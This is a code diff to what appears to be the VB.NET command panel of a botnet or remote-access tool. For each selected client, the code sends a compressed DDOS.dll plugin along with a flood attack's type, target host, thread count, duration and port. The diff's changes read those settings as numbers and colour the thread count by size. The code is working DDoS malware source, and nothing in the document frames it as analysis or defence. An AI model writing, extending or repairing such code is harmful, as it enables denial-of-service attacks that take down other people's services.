@@ -15,7 +15,7 @@
                         Flood_Attack.Enabled = False
                         Flood_Port.Enabled = False
                         For Each x As ListViewItem In Main.L1.SelectedItems
-                            Main.S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DDOS.dll"), True)) + SPL + Flood_Attack.Text + "|'P'|" + "1" + "|'P'|" + Flood_Host.Text + "|'P'|" + Flood_Threads.Text + "|'P'|" + Flood_Time.Text + "|'P'|" + Flood_Port.Text)
+                            Main.S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DDOS.dll"), True)) + SPL + Flood_Attack.Text + "|'P'|" + "1" + "|'P'|" + Flood_Host.Text + "|'P'|" + Flood_Threads.Value.ToString + "|'P'|" + Flood_Time.Value.ToString + "|'P'|" + Flood_Port.Value.ToString)
                         Next
                     Else
                         MetroTile1.Text = "Please Wait.."
@@ -51,6 +51,18 @@
         Else
             MetroLabel3.Visible = False
             Flood_Port.Visible = False
+        End If
+    End Sub
+
+    Private Sub Flood_Threads_ValueChanged(sender As Object, e As EventArgs) Handles Flood_Threads.ValueChanged
+        If Flood_Threads.Value = 1 Then
+            Flood_Threads.ForeColor = Color.FromArgb(142, 188, 0)
+        ElseIf Flood_Threads.Value = 2 Then
+            Flood_Threads.ForeColor = Color.FromArgb(142, 188, 0)
+        ElseIf Flood_Threads.Value = 3 Then
+            Flood_Threads.ForeColor = Color.Yellow
+        ElseIf Flood_Threads.Value >= 4 Then
+            Flood_Threads.ForeColor = Color.Red
         End If
     End Sub
 End Class
